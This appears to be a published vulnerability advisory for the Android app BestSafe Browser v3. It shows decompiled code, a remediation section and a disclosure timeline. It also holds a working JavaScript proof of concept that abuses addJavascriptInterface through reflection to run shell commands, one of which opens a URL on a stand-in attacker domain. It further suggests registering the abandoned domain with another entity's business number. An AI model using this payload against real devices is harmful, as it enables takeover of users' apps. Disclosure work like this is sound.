@@ -1,0 +1,134 @@
+# Exploit Title: BestSafe Browser FREE NoAds - Remote Code Execution
+# Date: 30/Jun/17
+# Exploit Author: MaXe
+# Vendor Homepage: https://play.google.com/store/apps/details?id=a1.bestsafebrowser.com
+# Software Link: See APK archive websites
+# Screenshot: Refer to https://www.youtube.com/watch?v=VXNVzjsH0As
+# Version: v3
+# Tested on: Android 4.1.0 (Google APIs) - API Level 16 - x86
+# CVE : N/A
+
+BestSafe Browser FREE NoAds - Remote Code Execution (No MITM Required!)
+
+Version affected: v3
+
+App Info: The Android application reviewed, according to the developer, is "secure" and is built for a better Google experience, and is essential for those who wish to protect their right to privacy.
+
+External Links:
+https://play.google.com/store/apps/details?id=a1.bestsafebrowser.com
+http://www.appsalesandsupport.com
+
+
+Credits: MaXe (@InterN0T)
+Special Thanks: no1special
+Shouts: SubHacker and the rest of the awesome infosec community.
+
+
+-:: The Advisory ::-
+The Android application is vulnerable to Remote Code Execution attacks. This is caused by the following lines of code within the
+\a1\bestsafebrowser\com\main.java file: (Lines 380 - 387)
+    public static String _activity_create(boolean z) throws Exception {
+        mostCurrent._activity.RemoveAllViews();
+        Common.ProgressDialogShow(mostCurrent.activityBA, "Attempting to access the Internet");
+        Phone phone = new Phone();
+        main a1_bestsafebrowser_com_main = mostCurrent;
+        _googleurl = "http://www.comparison.net.au";
+        mostCurrent._activity.LoadLayout("Start", mostCurrent.activityBA);
+        ActivityWrapper activityWrapper = mostCurrent._activity;
+
+and
+
+Lines 634 - 641:
+    public static String _tr_tick() throws Exception {
+        ...
+        webViewExtras = mostCurrent._webviewextras1;
+        WebViewExtras.clearCache((WebView) mostCurrent._webview1.getObject(), true);
+        webViewExtras = mostCurrent._webviewextras1;
+        WebViewExtras.addJavascriptInterface(mostCurrent.activityBA, (WebView) mostCurrent._webview1.getObject(), "MyEventName");
+        WebViewWrapper webViewWrapper = mostCurrent._webview1;
+        main a1_bestsafebrowser_com_main2 = mostCurrent;
+        webViewWrapper.Loadproton-Url(_googleurl);
+        str = "";
+
+In addition to the above, the following App configuration also aids in the exploitability of this issue: (File: AndroidManifest.xml, Line: 3)
+    <uses-sdk android:minSdkVersion="5" android:targetSdkVersion="14" />
+
+If an attacker registers the domain "comparison.net.au" (it is currently NOT registered) and creates a DNS record for "www.comparison.net.au" then the attacker has full control over anyone who installs and runs this app. This vulnerability can be used to execute arbitrary Java code in the context of the application. The ".net.au" TLD requires slightly more validation during registration, in terms of a valid ABN, ACN or Trademark number. However, as this type of validation is fully automated and this type of information is public, an attacker can easily obtain another entity's ABN, ACN or Trademark number and use that to register a domain.
+
+In addition to the above, in case someone has registered "comparison.net.au", then if an attacker performs a MITM attack against "www.comparison.net.au" by e.g. hijacking the domain name, DNS, IP prefix, or by serving a malicious wireless access point (or hijacking a legitimate one), or by hacking the server at "www.comparison.net.au", then the attacker can also abuse this vulnerability.
+
+The root cause of this vulnerability is caused by addJavascriptInterface() within the WebViewer, which in older API versions can be used to execute arbitrary Java code by using reflection to access public methods with attacker provided JavaScript.
+
+
+-:: Proof of Concept ::-
+A successful attack that makes "www.comparison.net.au" serve the following code:
+<script>
+  function execute(cmd){
+    return MyEventName.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmd);
+  }
+  execute(['/system/bin/sh', '-c', 'echo InterN0T was here > /data/data/a1.bestsafebrowser.com/owned']);
+  execute(['/system/bin/sh', '-c', 'am start -a android.intent.action.VIEW -d "http://attacker-domain.tld/video.mp4"']);
+  </script>
+  This application has been owned.
+
+Will make the Android application create a new file in the App directory named: owned, and also play a video chosen by the attacker as an example.
+
+Instead of creating a new file, the attacker can also use the "drozer" payload for example. Refer to the references further below.
+
+
+-:: Solution ::-
+The Android app code should not use the addJavaScriptInterface() function. Instead the following code should be used:
+    WebView webView = new WebView(this);
+    setContentView(webView);
+    ...
+Alternatively, the application manifest should specify API levels JELLY_BEAN_MR1 and above as follows:
+    <manifest>
+    <uses-sdk android:minSdkVersion="17" />
+    ...
+    </manifest>
+
+The URL used ("http://www.comparison.net.au") should ALSO use HTTPS (and verify the hostname and certificate properly).
+
+Last but not least, the following code can also be used to determine whether the addJavascriptInterface should be enabled or not:
+    private void exposeJsInterface() {
+        if (VERSION.SDK_INT < 17) {
+            Log.i(TAG, "addJavascriptInterface() bridge disabled.");
+        } else {
+            addJavascriptInterface(Object, "EVENT_NAME_HERE");
+        }
+    }
+
+
+
+References:
+http://50.56.33.56/blog/?p=314
+https://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)
+https://labs.mwrinfosecurity.com/blog/webview-addjavascriptinterface-remote-code-execution/
+https://labs.mwrinfosecurity.com/advisories/webview-addjavascriptinterface-remote-code-execution/
+https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=129859614
+
+Filename: BestSafe Browser FREE NoAds_vv3.apk
+File size: 10,593,599 Bytes
+
+md5: db5cef1b11df38ba7a560d147e6be3e6
+sha1: dd08b1c8af4e8fb4b62c32aed3cb3544042774d6
+sha256: bcf7d43f060d7e50d02a1f38abf6308961c7fd0aa0bac718e01c2ead28d7ea1d
+
+App Name: BestSafe Browser FREE NoAds
+Package Name: a1.bestsafebrowser.com
+Package Version: v3
+
+:)
+
+=== EOF ===
+
+Video demo:
+https://www.youtube.com/watch?v=VXNVzjsH0As
+
+FULL POC Archive:
+https://mega.nz/#!saRkTCxD!p42DYndcH95iFViaLCmtUvt9Xwbtm1x9MiND--Xng38
+
+The following is the timeline:
+29 June 2017 - Vendor is notified.
+29 June 2017 - Vendor pulls apps from app store and files privacy and trademark complaints with YouTube. Vendor does not intend to fix vulnerabilities.
+30 June 2017 - All disclosure websites notified, including Exploit-DB.
